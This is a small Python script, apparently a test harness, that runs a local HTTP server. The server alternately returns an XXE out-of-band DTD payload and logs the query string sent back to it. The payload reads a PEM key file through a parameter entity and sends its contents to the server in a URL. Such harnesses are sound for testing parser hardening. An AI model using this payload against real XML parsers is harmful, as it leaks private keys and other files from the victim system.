from http.server import HTTPServer, BaseHTTPRequestHandler
import sys
import os

count = 0

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler): 
    def do_GET(self):
        self.send_response(200)
        self.end_headers()

        global count
        global port
        global folder
        
        cwd = os.getcwd()
        if count % 2 == 0:
            answer = f'<!ENTITY % payl SYSTEM "file://{folder}/TestData/long_key.pem">' + \
                     '<!ENTITY % int "<!ENTITY send SYSTEM \'' + \
                     f'http://localhost:{port}?p=%payl;\'>">'
        else:
            secret_data = self.path
            answer = f"nikakoi_ne_secretik_with_len={len(secret_data)}_" + secret_data[0:50]

        print(self.path)
        print("My answer:")
        print(answer)
        
        self.wfile.write(answer.encode('utf8'))
        count += 1
        

if len(sys.argv) < 3:
    sys.exit(1)

port = int(sys.argv[1])
folder = sys.argv[2]

httpd = HTTPServer(('localhost', port), SimpleHTTPRequestHandler)
httpd.serve_forever()
